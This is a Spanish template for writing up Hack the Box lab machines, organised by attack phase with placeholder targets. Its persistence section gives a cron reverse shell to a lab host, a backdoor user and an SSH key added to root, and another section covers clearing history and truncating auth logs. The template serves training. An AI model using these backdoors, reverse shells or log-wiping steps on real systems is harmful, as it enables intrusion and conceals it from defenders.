# Hack the Box - Documentación de Máquina

## Información General

**Nombre de la Máquina:** [Nombre]  
**Dificultad:** 🟩 Fácil | 🟨 Media | 🟥 Difícil  
**IP Objetivo:** 10.10.11.XXX  
**Sistema Operativo:** Linux | Windows  
**Fecha de Inicio:** DD/MM/YYYY  
**Fecha de Finalización:** DD/MM/YYYY  

**Descripción:**
> [Breve descripción de la máquina y su objetivo]

---

## 📊 Resumen Ejecutivo

| Concepto | Resultado |
|----------|-----------|
| **Tácticas MITRE ATT&CK** | [Enumera las tácticas usadas: Initial Access, Exploitation, etc.] |
| **Vulnerabilidades Encontradas** | [Listado de CVEs o vulnerabilidades descubiertas] |
| **Herramientas Principales** | [Herramientas clave utilizadas] |
| **Dificultad Real** | [Tu opinión sobre la dificultad] |
| **Tiempo Total** | [Tiempo que tardaste] |

---

## 🔍 FASE 1: RECONOCIMIENTO PASIVO

### Objetivo
Recopilar información sin contacto directo con la máquina.

### Tácticas MITRE ATT&CK
- **Reconnaissance**: Gathering Information

### Información Obtenida

**Datos del Dominio (si aplica):**
```bash
# Comando ejecutado:
whois [domain.com]

# Resultado:
[Pega aquí los resultados relevantes]
```

**Búsquedas en línea:**
- Shodan: [Información encontrada]
- BuiltWith: [Tecnologías detectadas]
- Google Dorks: [Resultados relevantes]
- Archive.org: [Cambios históricos]

**Notas:**
- [Observaciones importantes]
- [Información clave descubierta]

---

## 📡 FASE 2: ENUMERACIÓN

### Objetivo
Contacto directo con el objetivo para identificar servicios, puertos y vulnerabilidades.

### Tácticas MITRE ATT&CK
- **Discovery**: Scanning
- **Resource Development**: Obtain Infrastructure

### 2.1 Escaneo de Puertos

```bash
# Comando inicial
nmap -sn 10.10.11.XXX

# Resultado:
[Host está UP/DOWN]
```

**Escaneo de Puertos Completo:**
```bash
# Comando
nmap -p- --open 10.10.11.XXX

# Puertos Abiertos Encontrados:
```

| Puerto | Estado | Servicio |
|--------|--------|----------|
| 22 | open | ssh |
| 80 | open | http |
| [Puerto] | [Estado] | [Servicio] |

### 2.2 Detección de Versiones y Scripts

```bash
# Comando
nmap -sV -sC -A 10.10.11.XXX -oA nmap_detailed

# Versiones Detectadas:
```

```
[Pega el output de nmap aquí]
```

**Servicios y Versiones:**
- SSH: OpenSSH X.X.X (Vulnerable a: [CVE si aplica])
- HTTP: Apache/Nginx X.X.X (Vulnerable a: [CVE si aplica])
- [Otros servicios]

### 2.3 Enumeración Web (si aplica)

**Descubrimiento de Directorios:**
```bash
# Comando
gobuster dir -u http://10.10.11.XXX -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Directorios Encontrados:
```

| Directorio | Código | Descripción |
|-----------|--------|-------------|
| /admin | 200 | Panel de administración |
| /uploads | 403 | Directorio de cargas |
| /config.php | 200 | Archivo de configuración |
| [Directorio] | [Código] | [Descripción] |

**Análisis de Tecnologías:**
```bash
# Comando
nikto -h http://10.10.11.XXX
```

- Framework: [Detectado]
- CMS: [Detectado]
- Plugins/Extensiones: [Detectados]

### 2.4 Enumeración SMB/Shares (si aplica)

```bash
# Comando
enum4linux 10.10.11.XXX

# Información Obtenida:
```

- Usuarios encontrados: [Lista]
- Comparticiones: [Lista y permisos]
- Vulnerabilidades: [Listadas]

### 2.5 Otras Enumeraciones

**LDAP:**
```bash
ldapsearch -h 10.10.11.XXX -x -s base namingContexts
```

**FTP:**
```bash
ftp 10.10.11.XXX
# Resultado: [Acceso anónimo disponible / Credenciales requeridas]
```

**SNMP:**
```bash
snmpwalk -c public 10.10.11.XXX
```

### 2.6 Análisis de Resultados

**Vulnerabilidades Identificadas:**

1. **Vulnerabilidad #1**: [Nombre]
   - Tipo: SQL Injection | XSS | RCE | etc.
   - Severidad: Crítica | Alta | Media | Baja
   - Evidencia: [Comando o Screenshot]
   - CVE: [si aplica]

2. **Vulnerabilidad #2**: [Nombre]
   - Tipo: [Tipo]
   - Severidad: [Nivel]
   - Evidencia: [Detalles]

**Vectores de Ataque Potenciales:**
- [ ] Vector 1
- [ ] Vector 2
- [ ] Vector 3

---

## 💥 FASE 3: EXPLOTACIÓN

### Objetivo
Explotar vulnerabilidades identificadas para obtener acceso.

### Tácticas MITRE ATT&CK
- **Initial Access**: Exploit Public-Facing Application
- **Execution**: Command and Scripting Interpreter

### 3.1 Explotación Seleccionada

**Vulnerabilidad Explotada:** [Nombre]  
**Razón de la Selección:** [Por qué elegiste esta sobre las otras]

### 3.2 Proceso de Explotación

**Paso 1: Preparación**
```bash
# Acciones previas necesarias
[Comandos y acciones preparatorias]
```

**Paso 2: Creación del Payload**
```bash
# Si usas msfvenom
msfvenom -p [payload] LHOST=10.10.14.XXX LHOST=4444 -f [format] -o payload.ext

# Si es exploit personalizado
[Código o comandos]
```

**Paso 3: Ejecución del Exploit**

```bash
# Opción A: Metasploit
msfconsole
> search [vulnerability]
> use exploit/[path/to/exploit]
> set RHOSTS 10.10.11.XXX
> set LHOST 10.10.14.XXX
> set LPORT 4444
> exploit

# Opción B: SQLmap
sqlmap -u "http://10.10.11.XXX/page.php?id=1" --dbs

# Opción C: Manual
[Comando o script personalizado]
```

**Resultado:**
```
[Output del exploit]
```

### 3.3 Obtención de Acceso Inicial

**Tipo de Acceso:** Shell | RCE | WebShell | Credenciales  

**Shell Obtenido:**
```bash
# Comando para verificar
whoami
id
hostname

# Resultado:
# user: www-data
# uid: 33(www-data) gid: 33(www-data)
# hostname: target-machine
```

**Screenshots:**
```
[Descripción de capturas o evidencia del acceso]
```

---

## 🚀 FASE 4: POST-EXPLOTACIÓN & ESCALADA DE PRIVILEGIOS

### Objetivo
Consolidar acceso y escalar privilegios a root/SYSTEM.

### Tácticas MITRE ATT&CK
- **Privilege Escalation**: Sudo/Runas
- **Persistence**: Cron Job, Service Creation
- **Defense Evasion**: Indicator Removal

### 4.1 Enumeración Post-Explotación

**Sistema Operativo:**
```bash
cat /etc/os-release  # Linux
systeminfo           # Windows
```

**Usuarios y Permisos:**
```bash
# Linux
id
sudo -l
cat /etc/sudoers

# Windows
whoami /priv
Get-LocalUser
```

### 4.2 Búsqueda de Vectores de Escalada

**Linux:**

```bash
# Binarios con SUID
find / -perm -4000 2>/dev/null

# Resultado:
/usr/bin/sudo (vulnerabilidad: CVE-XXXX-XXXXX)
/usr/bin/cat (puede leer archivos sensibles)
```

**Script Automatizado:**
```bash
# Descargar linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Output importante:
[Pega las secciones relevantes]
```

**Windows:**

```powershell
# Script PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks

# Resultados:
[Vulnerabilidades detectadas]
```

### 4.3 Explotación de Escalada

**Vector de Escalada Elegido:** [Nombre]  
**Razón:** [Por qué elegiste este]

**Paso 1: Preparación**
```bash
# Si necesitas compilar exploit
gcc exploit.c -o exploit
chmod +x exploit
```

**Paso 2: Transferencia de Archivos**
```bash
# En tu máquina (servidor)
python3 -m http.server 8000

# En target
wget http://10.10.14.XXX:8000/exploit
# o
curl http://10.10.14.XXX:8000/exploit -o exploit
```

**Paso 3: Ejecución**
```bash
./exploit
# o
sudo -u root /usr/bin/nmap --interactive
# o
use cron job vulnerability
```

**Resultado:**
```bash
# Verificación de escalada
whoami
id
# Resultado: uid=0(root)
```

### 4.4 Obtención de Flags

**User Flag:**
```bash
cat /home/user/user.txt
# Flag: [FLAG_AQUI]
```

**Root Flag:**
```bash
cat /root/root.txt
# Flag: [FLAG_AQUI]
```

### 4.5 Persistencia (Opcional)

```bash
# Crear backdoor
# Opción 1: Agregar usuario
useradd -m backdoor -s /bin/bash
echo "backdoor:password123" | chpasswd

# Opción 2: Cron job
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1'") | crontab -

# Opción 3: SSH key
echo "ssh-rsa [public-key]" >> /root/.ssh/authorized_keys
```

### 4.6 Cobertura de Huellas

```bash
# Limpiar historial
history -c
export HISTFILE=/dev/null

# Eliminar archivos temporales
rm ~/.bash_history
rm /tmp/exploit
rm /tmp/linpeas.sh

# Revisar logs
cat /var/log/auth.log | grep [tu_usuario]
# Considerar: truncate -s 0 /var/log/auth.log
```

---

## 📚 Lecciones Aprendidas

### Conceptos Clave

1. **Concepto #1**: [Explicación]
   - Aplicación práctica: [Cómo lo usaste]
   - Recurso útil: [Links o referencias]

2. **Concepto #2**: [Explicación]
   - Aplicación práctica: [Cómo lo usaste]

### Errores Cometidos

- ❌ Error #1: [Qué hiciste mal]
  - Solución: [Cómo lo arreglaste]
  - Lección: [Qué aprendiste]

### Comandos Útiles Descubiertos

```bash
# Comando útil 1
comando_interesante --flag

# Comando útil 2
otro_comando útil
```

### Herramientas Recomendadas

- **[Herramienta]**: [Por qué es útil]
- **[Herramienta]**: [Por qué es útil]

---

## 🔗 Referencias y Recursos

- [Artículo sobre CVE-XXXX-XXXXX](link)
- [Exploit en GitHub](link)
- [HackTricks - Técnica específica](link)
- [MITRE ATT&CK - Técnica específica](link)

---

## 📋 Checklist de Documentación

- [ ] Fase de reconocimiento completada y documentada
- [ ] Enumeración exhaustiva realizada
- [ ] Vulnerabilidades identificadas
- [ ] Explotación documentada con pasos
- [ ] Escalada de privilegios lograda
- [ ] Ambas flags obtenidas
- [ ] Lecciones aprendidas escritas
- [ ] Screenshots/evidencia incluida
- [ ] Comandos comentados y explicados

---

## 📝 Notas Adicionales

[Cualquier información adicional, observaciones, o errores que cometiste que no encajen en las secciones anteriores]

---

**Última actualización:** 28/7/2026  
**Estado:** ✅ Completado | 🟡 En Progreso | ❌ Sin iniciar
